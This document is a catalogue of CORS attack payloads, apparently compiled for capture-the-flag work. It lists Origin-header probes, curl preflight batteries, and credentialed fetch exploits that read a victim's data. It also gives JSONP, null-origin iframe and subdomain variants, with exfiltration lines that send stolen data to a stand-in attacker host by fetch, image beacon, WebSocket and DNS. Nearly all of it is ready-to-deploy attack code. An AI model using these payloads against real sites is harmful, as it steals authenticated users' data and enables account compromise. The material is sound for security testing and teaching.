# Payload variants — every CORS probe and exploit string, catalogued

The complete payload catalog — each a ready-to-send probe or a
ready-to-deploy exploit fragment.

---

## A. The Origin-header payloads — the measurement probes

```bash
# a foreign origin — the base probe
Origin: https://evil.com
Origin: https://attacker.example
Origin: null
Origin: https://'+$RANDOM+'.com

# the lookalike probes
Origin: https://target.com.evil.com
Origin: https://eviltarget.com
Origin: https://evil-target.com
Origin: https://sub.target.com

# the URL-parse probes
Origin: https://target.com@evil.com
Origin: https://evil.com?target.com
Origin: https://evil.com#target.com
Origin: https://target.com%2eevil.com
Origin: https://target.com%252eevil.com
Origin: https://target%60com.evil.com
Origin: https://target.com%60.evil.com
Origin: https://target.com%5f.evil.com
Origin: https://target.com.
Origin: https://target.com..

# the scheme/port/case probes
Origin: http://target.com
Origin: https://target.com:443
Origin: https://target.com:444
Origin: HTTP://TARGET.COM
Origin: https://TARGET.com
Origin: https://tArGeT.cOm

# the special-char probes
Origin: https://target_com
Origin: https://target-com
Origin: https://target`com
Origin: https://targetXcom
Origin: https://target;com
Origin: https://target|com
Origin: https://target.com;evil.com
Origin: https://target.com|evil.com

# the edge-case probes
Origin: file://
Origin: file:///etc/passwd
Origin: chrome-extension://abc
Origin: about:blank
Origin: data:text/html,
Origin: target.com
Origin: https:////target.com
Origin: https:/target.com
```

## B. The preflight payloads — the non-simple probes

```bash
# the OPTIONS + the ask
curl -i -X OPTIONS "$BASE/api/x" \
  -H 'Origin: https://evil.com' \
  -H 'Access-Control-Request-Method: GET' \
  -H 'Access-Control-Request-Headers: X-Token'

# the method-ask battery
for m in GET POST PUT DELETE PATCH HEAD OPTIONS; do
  curl -s -i -X OPTIONS "$BASE/api/x" \
    -H 'Origin: https://evil.com' \
    -H "Access-Control-Request-Method: $m" | \
    grep -i 'access-control-allow-methods'
done

# the header-ask battery
for h in X-Token Authorization Content-Type X-Custom Accept X-Api-Key; do
  curl -s -i -X OPTIONS "$BASE/api/x" \
    -H 'Origin: https://evil.com' \
    -H 'Access-Control-Request-Method: GET' \
    -H "Access-Control-Request-Headers: $h" | \
    grep -i 'access-control-allow-headers'
done
```

## C. The fetch payloads — the exploit JS

```js
// the canonical read
fetch('https://t/api/me',{credentials:'include'})
 .then(r=>r.json()).then(d=>fetch('https://a/?d='+btoa(JSON.stringify(d))))

// the DOM-scrape
fetch('https://t/admin',{credentials:'include'})
 .then(r=>r.text()).then(h=>{var m=h.match(/FLAG\{[^}]+\}/);
   if(m)fetch('https://a/?f='+m[0])})

// the Bearer read — a custom-header credentialed fetch
fetch('https://t/api/me',{credentials:'include',
  headers:{'Authorization':'Bearer '+TOKEN}})
 .then(r=>r.json()).then(d=>fetch('https://a/?d='+btoa(JSON.stringify(d))))

// the chained read
fetch('https://t/api/token',{credentials:'include'})
 .then(r=>r.json())
 .then(t=>fetch('https://t/api/flag?k='+t.key,{credentials:'include'}))
 .then(r=>r.text()).then(d=>fetch('https://a/?d='+d))

// the retry variant
for(var i=0;i<3;i++){
  fetch('https://t/api/me',{credentials:'include'})
   .then(r=>r.json()).then(d=>fetch('https://a/?d='+btoa(JSON.stringify(d))))
   .catch(()=>{})
}
```

## D. The exfil payloads — the data-out strings

```js
// the GET
fetch('https://a/?d='+btoa(JSON.stringify(d)))
// the img
new Image().src='https://a/x?d='+btoa(JSON.stringify(d))
// the beacon
navigator.sendBeacon('https://a/',JSON.stringify(d))
// the ws
var w=new WebSocket('wss://a/x');w.onopen=()=>w.send(JSON.stringify(d))
// the postMessage
parent.postMessage(JSON.stringify(d),'*')
// the redirect
location='https://a/?f='+d.flag
// the DNS
new Image().src='https://'+btoa(d)+'.a.com/'
// the form
'<form action="https://a/x" method="POST"><input name="d" value="'+btoa(d)+'"></form>'
```

## E. The JSONP payloads — the script-tag reads

```html
<script src="https://t/api/me?callback=leak"></script>
<script src="https://t/api/me?cb=leak"></script>
<script src="https://t/api/me?jsonp=leak"></script>
<script src="https://t/api/me?callback=parent.leak"></script>
<script>function leak(d){fetch('https://a/?d='+JSON.stringify(d))}</script>
```

## F. The null-origin payloads — the opaque contexts

```html
<!-- a data: URL page -->
data:text/html,<script>fetch('https://t/api/x',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://a/?d='+d))</script>

<!-- a sandboxed iframe -->
<iframe sandbox="allow-scripts" src="data:text/html,<script>fetch(...)</script>"></iframe>

<!-- a srcdoc iframe -->
<iframe sandbox="allow-scripts" srcdoc="<script>fetch(...)</script>"></iframe>
```

## G. The subdomain payloads — a `*.target.com` page

```html
<!-- hosted on sub.target.com — the trusted subdomain -->
<script>fetch('https://target.com/api/me',{credentials:'include'})
.then(r=>r.json()).then(d=>fetch('https://a/?d='+btoa(JSON.stringify(d))))</script>
```

## H. The write-back payloads — the on-target exfil

```js
// a comment
fetch('https://t/api/comment',{method:'POST',credentials:'include',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({text:d.flag})})
// a profile field
fetch('https://t/api/profile',{method:'PUT',credentials:'include',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({bio:d.flag})})
// a stored page
fetch('https://t/api/post',{method:'POST',credentials:'include',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({title:d.flag})})
```

## I. The payload-selection index — which payload for which shape

```text
a reflect              → any foreign Origin payload
a null-allow           → the 'null' Origin + a data: page
a prefix/suffix        → the lookalike Origin payloads
a subdomain-trust      → the sub.target.com Origin + page
a url-parse bug        → the @/?/# Origin payloads
a regex check          → the special-char Origin payloads
a JSONP endpoint       → the ?callback= script-tag payloads
a write-back surface   → the on-target POST payloads
a screenshotting bot   → the DOM-writeback payloads
```

## J. The payload-evidence pairing — the expected result per payload

```text
payload                            expected-if-vulnerable
Origin: https://evil.com           ACAO: https://evil.com
Origin: null                        ACAO: null
Origin: https://target.com.evil.com ACAO: https://target.com.evil.com
Origin: https://sub.target.com      ACAO: https://sub.target.com
OPTIONS + custom-header-ask         ACAH lists the header
the fetch+exfil page                the OOB hit carries the data
```
